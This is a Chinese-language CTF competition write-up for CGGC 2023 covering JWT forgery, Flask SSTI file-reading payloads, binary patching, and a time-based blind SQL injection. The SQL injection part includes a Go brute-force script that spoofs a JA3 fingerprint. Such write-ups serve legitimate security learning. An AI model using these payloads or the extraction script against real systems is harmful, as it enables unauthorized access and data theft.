---
title: "CGGC CTF 2023 初賽 Writeup"
date: 2023-12-09T17:06:08+08:00
draft: false
showSummary: true
summary: "CGGC CTF 2023"
slug: "CGGC+CTF+2023+Writeup"
tags: ["CGGC", "CTF", "2023"]
---

## [Web] bossti
> Description:
> 
> I wish you were a boss wannabe.

![bossti_1](images/bossti_1.png)
明顯就是要竄改 JWT 來登入

![bossti_2](images/bossti_2.png)
JWT 解開後，簽名的 `Secret` 是空值。

![bossti_3](images/bossti_3.png)
把 JWT 改成題目提示的 boss。
```JWT
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYm9zcyIsImhhY2siOiIifQ.VhS5VSRlR_RrgIlF-gdl-s1_PVHPQCxB3s8oHgwEPJ4
```

![bossti_4](images/bossti_4.png)
登入之後變成 SSTI 的題目，透過 `Wappalyzer` 知道他是 Python Flask，所以要找 Python 的 SSTI payload 來試。


![bossti_5](images/bossti_5.png)
在 `hack` 欄位用上 `{{ 7*6 }}`，結果伺服器幫我們算好 `42`，確定存在 SSTI。
```URL
http://10.99.111.109:5000/boss?data={%27user_id%27%3A+1,+%27role%27%3A+%27boss%27,+%27hack%27%3A+%27{{7*6}}%27}
```

![bossti_6](images/bossti_6.png)
題目要我們嘗試找到 `Flag.txt`，所以找一下讀檔的 payload。本來應該要找到方法 list files，但通靈當前目錄中了就不需要了。
```URL
http://10.99.111.109:5000/boss?data={%27user_id%27%3A+1,+%27role%27%3A+%27boss%27,+%27hack%27%3A+%27{{get_flashed_messages.__globals__.__builtins__.open(%22Flag.txt%22).read()}}%27}
```

- flag: `CGGC{"S$T1_V3RY_EZ_2_Pwn3D_C0ngr4t$"} `

## [MISC] Space game
> Description:
> 
> Play a fun space game and try to get a high score.
> Move using the arrow keys and press 'Z' to attack.

![space_game_1](images/space_game_1.png)
`binjgb` 是一個 gameboy 模擬器，從 github 上看說要把 .gb 檔案放到伺服器上。

![space_game_2](images/space_game_2.png)
姑且看一下開發工具記錄到的載入請求，發現有把 `game.gb` 下載到瀏覽器上，然後 flag 就藏在裡面。

- flag: `CGGC{Y0U_WIN!!123}`

## [Reverse] GaoYi
> Description:
>
> Anyone can participate with three million US dollars.

![gaoyi_1](images/gaoyi_1.png)
一個執行檔，要跟高義賭兩局，贏了才有 flag。

![gaoyi_2](images/gaoyi_2.png)
main 函數，有兩場賭局，把使用者輸入讀進來後再判斷勝負。

![gaoyi_3](images/gaoyi_3.png)
我們要的 flag 在 `readFlag()`。

![gaoyi_4](images/gaoyi_4.png)
`readFlag()` 裡面在算 flag，本想自己算一遍，但覺得太蠢。

![gaoyi_5](images/gaoyi_5.png)
解題思路是嘗試跳過中間的賭局，直接給我 flag 吧！所以要跳到 `0x00401e3c`，讓他直接算 flag。

![gaoyi_6](images/gaoyi_6.png)
腦筋動到 main 函數一開始的地方，試試看直接跳。

![gaoyi_7](images/gaoyi_7.png)
![gaoyi_8](images/gaoyi_8.png)
原本的指令 `eb6a` 改成 `e939040000`。

![gaoyi_9](images/gaoyi_9.png)
![gaoyi_10](images/gaoyi_10.png)
修改 binary。

![gaoyi_11](images/gaoyi_11.png)
Tada!

- flag: `CGGC{J00_sh4ll_n07_sH1P_S3cR37S_70_cuS70M3r}`

## [Web] Flag Slot Machine
> Description:
>
> If you're lucky enough, you'll be able to get the flag.

```php
// flag.php
<?php
include_once("config.php");

if(isset($_GET["secret"])) {
    $pwd = $_GET["secret"];
    $dbname = 'secret_db';
    $conn = new mysqli(HOST, DBUSER, DBPASS, $dbname);
    
    if ($conn->connect_error) {
        die('Connection failed: ' . $conn->connect_error);
    }

    $stmt = $conn->prepare("SELECT * FROM s3cret_table");
    $stmt->execute();

    $result = $stmt->get_result();

    $response = array("data" => generateRandomString(strlen($flag)));
    if ($result->num_rows > 0) {
        $res = $result->fetch_assoc();
        if($res["secret"] == $pwd)
            $response = array("data" => $flag); // <-- flag here
    }
```
flag.php 要我們提供 secret 在 GET 參數中，如果符合 DB 中的 secret 就可以拿到 flag。

```php
// login.php
<?php
include_once("config.php");
fingerprint_check();

if(isset($_POST['user']) && isset($_POST['pwd'])) {
    $user = $_POST['user'];
    $pwd = $_POST['pwd'];
} else {
    $user = $pwd = "";
}

//...

if($user != "" && $pwd != "") {
	$dbname = 'slot_db';
	$conn = new mysqli(HOST, DBUSER, DBPASS, $dbname);
	if ($conn->connect_error) {
	    die('Connection failed: ' . $conn->connect_error);
	}

	$conn->set_charset("utf8");
	$stmt = $conn->prepare("SELECT * FROM users WHERE username = '" . $user . "' and password = '" . md5($pwd) . "'"); // <-- SQLi here
	$stmt->execute();
	$result = $stmt->get_result();

	if ($result->num_rows > 0) {
	    $res = $result->fetch_assoc();
	    $_SESSION['login'] = $res["username"];
	    echo "<div>Login successful!</div>";
	    echo "<script>setTimeout(function(){ window.location.href = 'index.php'; }, 1000);</script>";
	} else {
	    echo "<div class=\"alert alert-danger\" role=\"alert\">Login failed! QAQ</div>";
	}
```
login.php 存在一個 SQL injection 漏洞，但很遺憾的是它並沒有回顯，因此我們不能直接把 DB 中的資料挖出來顯示到網頁上。

```php
// config.php
<?php
session_start();
define("FINGERPRINT", "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0");
define("DBUSER", "kaibro");
define("DBPASS", "superbig");
define("HOST", "localhost");
$flag = 'CGGC{fake_flag}';

function session_check() {
    if(!isset($_SESSION['login']) || $_SESSION['login'] == "") {
        header("Location: login.php");
        die("Plz login");
    }
}

function fingerprint_check() {
    if($_SERVER['HTTP_SSL_JA3'] !== FINGERPRINT) 
        die("Bad hacker! Wrong fingerprint!"); 
}
```
在開始嘗試登入前，我們會先被 JA3 指紋給擋住。這題在 Balsn CTF 出過，可以參考以下 writeup。一開始是跟 writeup 一樣用 NodeJS，但 NodeJS 的非同步執行實在是很難處理，所以請用 Go 的版本。
  - https://ctftime.org/writeup/37976

```sql
use mysql;
CREATE USER 'kaibro'@'localhost' IDENTIFIED BY 'superbig';
GRANT SELECT ON *.* TO 'kaibro'@localhost IDENTIFIED BY 'superbig' WITH GRANT OPTION;
FLUSH PRIVILEGES;


CREATE DATABASE slot_db;
use slot_db;
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (
  `id` int(11) DEFAULT NULL,
  `username` text,
  `password` text
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

LOCK TABLES `users` WRITE;
INSERT INTO `users` VALUES (1, 'kaibro', '4647570f7638e378e490db41c24c800a');
UNLOCK TABLES;

CREATE DATABASE secret_db;
use secret_db;

DROP TABLE IF EXISTS `s3cret_table`;
CREATE TABLE `s3cret_table` (
  `id` int(11) DEFAULT NULL,
  `secret` text
) ENGINE=MyISAM DEFAULT CHARSET=latin1;


LOCK TABLES `s3cret_table` WRITE;
INSERT INTO `s3cret_table` VALUES (1, 'meowmeowmeow');
UNLOCK TABLES;

```
SQL injection 用 UNION SELECT 要先找出欄位數量，題目有給 DB 結構，所以直接就知道是三個。然後我們想要 `secret_db.s3cret_table` 的 `secret`，因為沒辦法直接顯示出來，只能一個字一個字去比對出來。第一步我們想先知道 `secret` 的長度，這裡只能用 Time-based 的方法，當條件成真時 `sleep()` 幾秒，試了幾次後知道長度是 32。
- `user=kaibro' UNION Select 1,2,IF(length(secret)=32,SLEEP(5),0) FROM secret_db.s3cret_table WHERE id=1 -- '&pwd=123'`

接下來就是開始暴力比對密碼，一個字一個字拿出來比對 ASCII 碼，然後要注意的是 secret 每一段時間就會更新，所以千萬不要手動比對(對....我就浪費時間手動比對，也剛好知道可能字串是 [0-9a-f])，這邊也呼應前面所說的請用 Go 版本，因為 GO 比較好算時間差。

```go
package main

import (
    "fmt"
    "github.com/Danny-Dasilva/CycleTLS/cycletls"
    "strconv"
    "time"
    "net/http"
    "crypto/tls"
    "io/ioutil"
)

func main() {

    client := cycletls.Init()
    // secret length = 32
    // Body: 'user=kaibro' UNION Select 1,2,IF(length(secret)=32,SLEEP(5),0) FROM secret_db.s3cret_table WHERE id=1 -- '&pwd=123',
    secret := ""
    chars := "abcdef1234567890"

    for len(secret) < 32 {
        for _, char := range chars {
            payload := "user=kaibro' UNION Select 1,IF(SUBSTRING(secret," + strconv.Itoa(len(secret)+1) + ",1) = CHAR(" + strconv.Itoa(int(char)) + "),SLEEP(2),null),3 FROM secret_db.s3cret_table WHERE id=1 -- '&pwd=123"
            //fmt.Println(payload)
            start := time.Now()

            _, err := client.Do("https://10.99.111.111:8787/login.php", cycletls.Options{
                Body : payload,
                Ja3: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
                UserAgent: "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
                Headers: map[string]string{
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                InsecureSkipVerify: true,
                }, "POST");
            if err != nil {
                fmt.Print("Request Failed: " + err.Error())
            }

            elapsed := time.Since(start)
            //fmt.Println(elapsed)
            if (elapsed >= 2000000000) {
                secret = secret + string(char)
                fmt.Println(secret)
                break
            }
        }
    }
    http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
    response, err := http.Get("https://10.99.111.111:8787/flag.php?secret=" + secret)
    if err != nil {
        fmt.Print("Request Failed: " + err.Error())
    }
    // read response body
    body, error := ioutil.ReadAll(response.Body)
    if error != nil {
        fmt.Println(error)
    }
    // close response body
    response.Body.Close()

    // print response body
    fmt.Println(string(body))
}
```
    
![flag_slot_machine_1](images/flag_slot_machine_1.png)
![flag_slot_machine_2](images/flag_slot_machine_2.png)
暴力比對完後拿 `secret` 去餵 flag.php，就可以拿到 flag 了。

## [MISC] Link list
> Description:
>
> DO you know how automatic destination file work? (The flag is separarted into four parts)

![link_list_1](images/link_list_1.png)
在檔案最下面發現 last part
- C:\\Challenge\\`_l457_p4r7_15_h1dd3n!}`

![link_list_2](images/link_list_2.png)
用 `l l e n g e \` 後面的 path 才能找到順序正確的 flag 片段，用 `C:\Challenge\` 找的話順序會跑掉。
```
F L A G IS Pr ob bly Here! Youre Clo se Here It is_ CG GC{ 3 z _f 1 r5 7_ qu 4 r 7 3r _
```
- `CGGC{3z_f1r57_qu4r73r_`

![link_list_3](images/link_list_3.png)
這 part 則是把 PowerShell script 拿出來執行就可以了。

```powershell
C:\> $t='aRB3BDtBNRAiBGFBNBA2BGVB[tB0BDdBNRAzBDRB[tBtBD7BNtB>';for(($i=0);$i-lt$t.Length;$i++){$k+=[char]($t[$i]-bxor3)};[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($k))
m4l1c10u5_7h1rd_0n3
```
- `m4l1c10u5_7h1rd_0n3`

最後就剩下 second part 卡關了，所以這題沒解出來:(
1. `CGGC{3z_f1r57_qu4r73r_`
2. 
3. `m4l1c10u5_7h1rd_0n3`
4. `_l457_p4r7_15_h1dd3n!}`